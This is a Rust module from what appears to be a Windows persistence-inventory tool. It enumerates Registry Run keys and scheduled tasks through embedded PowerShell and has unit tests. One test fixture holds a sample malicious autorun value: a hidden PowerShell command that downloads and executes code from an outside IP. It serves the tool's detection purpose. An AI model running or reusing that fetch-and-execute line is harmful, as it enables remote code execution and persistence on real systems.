#![forbid(unsafe_code)]

use crate::ps::get_str;
use host_snapshot::json_items;
pub use host_snapshot::{AutorunObservation, RegistryAutorunObservation, ScheduledTaskObservation};

/// Run / RunOnce values from the machine and current-user hives.
pub const AUTORUN_SCRIPT: &str = r#"
$keys = @(
  @{ Hive='HKLM'; Path='HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' },
  @{ Hive='HKLM'; Path='HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce' },
  @{ Hive='HKLM'; Path='HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run' },
  @{ Hive='HKCU'; Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' },
  @{ Hive='HKCU'; Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' }
)
$res = foreach ($k in $keys) {
  $p = Get-ItemProperty -Path $k.Path -ErrorAction SilentlyContinue
  if ($p) {
    foreach ($prop in $p.PSObject.Properties) {
      if ($prop.Name -notmatch '^PS' -and $prop.Value) {
        [PSCustomObject]@{ Hive=$k.Hive; Key=$k.Path; ValueName=[string]$prop.Name; ValueData=[string]$prop.Value; User=[string]$env:USERDOMAIN + '\' + [string]$env:USERNAME }
      }
    }
  }
}
ConvertTo-Json -InputObject @($res) -Compress
"#;

pub const TASK_SCRIPT: &str = r#"
$res = @(Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
  $a = $_.Actions | Where-Object { $_.Execute } | Select-Object -First 1
  [PSCustomObject]@{
    TaskName = [string]$_.TaskName
    TaskPath = [string]$_.TaskPath
    State = [string]$_.State
    Action = if ($a) { [string]$a.Execute } else { $null }
    Arguments = if ($a) { [string]$a.Arguments } else { $null }
    RunLevel = if ($_.Principal) { [string]$_.Principal.RunLevel } else { $null }
    UserId = if ($_.Principal) { [string]$_.Principal.UserId } else { $null }
  }
})
ConvertTo-Json -InputObject $res -Compress
"#;

/// Executable portion of a Run value (`"C:\a b\x.exe" /arg` -> `C:\a b\x.exe`).
pub fn resolve_executable(command: &str) -> String {
    let command = command.trim();
    if let Some(rest) = command.strip_prefix('"') {
        return rest.split('"').next().unwrap_or("").to_string();
    }
    let lower = command.to_ascii_lowercase();
    for ext in [".exe", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".dll"] {
        if let Some(idx) = lower.find(ext) {
            return command[..idx + ext.len()].to_string();
        }
    }
    command.split_whitespace().next().unwrap_or("").to_string()
}

pub fn parse_autoruns_json(json: &str, timestamp: &str) -> Vec<AutorunObservation> {
    json_items(json)
        .iter()
        .filter_map(|item| {
            let data = get_str(item, "ValueData")?;
            let hive = get_str(item, "Hive").unwrap_or_default();
            Some(AutorunObservation {
                // HKLM entries run for every user; HKCU for the collecting user.
                owner: if hive == "HKCU" {
                    get_str(item, "User").map(|u| u.trim_matches('\\').to_string())
                } else {
                    Some("all users".to_string())
                },
                hive,
                key: get_str(item, "Key").unwrap_or_default(),
                value_name: get_str(item, "ValueName").unwrap_or_default(),
                resolved_executable: resolve_executable(&data),
                value_data: data,
                hash: None,
                // Registry value timestamps are not exposed by Get-ItemProperty.
                timestamp: timestamp.to_string(),
                mechanism: "registry_run".to_string(),
            })
        })
        .collect()
}

pub fn parse_tasks_json(json: &str, collected_at: &str) -> Vec<ScheduledTaskObservation> {
    json_items(json)
        .iter()
        .filter_map(|item| {
            let user = get_str(item, "UserId");
            Some(ScheduledTaskObservation {
                task_name: get_str(item, "TaskName")?,
                task_path: get_str(item, "TaskPath").unwrap_or_else(|| "\\".to_string()),
                state: get_str(item, "State").unwrap_or_else(|| "Unknown".to_string()),
                action: get_str(item, "Action"),
                arguments: get_str(item, "Arguments"),
                run_level: get_str(item, "RunLevel").unwrap_or_else(|| "Unknown".to_string()),
                collected_at: collected_at.to_string(),
                mechanism: "task_scheduler".to_string(),
                schedule: None,
                user,
            })
        })
        .collect()
}

/// Registry Run / RunOnce persistence points.
#[cfg(target_os = "windows")]
pub fn enumerate_registry_autoruns() -> Result<Vec<AutorunObservation>, String> {
    let now = chrono::Utc::now().to_rfc3339();
    let json = crate::ps::run(AUTORUN_SCRIPT)?;
    Ok(parse_autoruns_json(&json, &now))
}

#[cfg(not(target_os = "windows"))]
pub fn enumerate_registry_autoruns() -> Result<Vec<AutorunObservation>, String> {
    Err(crate::ps::unsupported("Registry Run keys"))
}

/// Task Scheduler tasks with their first executable action.
#[cfg(target_os = "windows")]
pub fn enumerate_scheduled_tasks() -> Result<Vec<ScheduledTaskObservation>, String> {
    let now = chrono::Utc::now().to_rfc3339();
    let json = crate::ps::run(TASK_SCRIPT)?;
    Ok(parse_tasks_json(&json, &now))
}

#[cfg(not(target_os = "windows"))]
pub fn enumerate_scheduled_tasks() -> Result<Vec<ScheduledTaskObservation>, String> {
    Err(crate::ps::unsupported("Get-ScheduledTask"))
}

#[cfg(test)]
mod tests {
    use super::*;

    const AUTORUNS: &str = r#"[{"Hive":"HKLM","Key":"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"SecurityHealth","ValueData":"%windir%\\system32\\SecurityHealthSystray.exe","User":"DESKTOP-7Q2\\Сирож"},{"Hive":"HKCU","Key":"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"OneDrive","ValueData":"\"C:\\Users\\Сирож\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background","User":"DESKTOP-7Q2\\Сирож"},{"Hive":"HKCU","Key":"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","ValueName":"Updater","ValueData":"powershell.exe -w hidden -nop -c iex(iwr http://203.0.113.9/a)","User":"DESKTOP-7Q2\\Сирож"}]"#;

    #[test]
    fn parses_run_keys() {
        let runs = parse_autoruns_json(AUTORUNS, "t");
        assert_eq!(runs.len(), 3);
        assert_eq!(runs[0].owner.as_deref(), Some("all users"));
        assert_eq!(
            runs[0].resolved_executable,
            "%windir%\\system32\\SecurityHealthSystray.exe"
        );
        assert_eq!(runs[1].owner.as_deref(), Some("DESKTOP-7Q2\\Сирож"));
        assert_eq!(
            runs[1].resolved_executable,
            "C:\\Users\\Сирож\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"
        );
        assert_eq!(runs[2].resolved_executable, "powershell.exe");
        assert!(runs.iter().all(|r| r.mechanism == "registry_run"));
    }

    const TASKS: &str = r#"[{"TaskName":"MicrosoftEdgeUpdateTaskMachineCore","TaskPath":"\\","State":"Ready","Action":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","Arguments":"/c","RunLevel":"Highest","UserId":"SYSTEM"},{"TaskName":"Proxy","TaskPath":"\\Microsoft\\Windows\\Autochk\\","State":"Disabled","Action":"%windir%\\system32\\rundll32.exe","Arguments":"/d acproxy.dll,PerformAutochkOperations","RunLevel":"Limited","UserId":null},{"TaskName":"ComHandlerOnly","TaskPath":"\\","State":"Ready","Action":null,"Arguments":null,"RunLevel":null,"UserId":null}]"#;

    #[test]
    fn parses_scheduled_tasks() {
        let tasks = parse_tasks_json(TASKS, "t");
        assert_eq!(tasks.len(), 3);
        assert_eq!(tasks[0].run_level, "Highest");
        assert_eq!(tasks[0].arguments.as_deref(), Some("/c"));
        assert_eq!(tasks[0].user.as_deref(), Some("SYSTEM"));
        assert_eq!(tasks[1].state, "Disabled");
        assert_eq!(tasks[2].action, None);
        assert_eq!(tasks[2].run_level, "Unknown");
        assert!(tasks.iter().all(|t| t.mechanism == "task_scheduler"));
    }
}
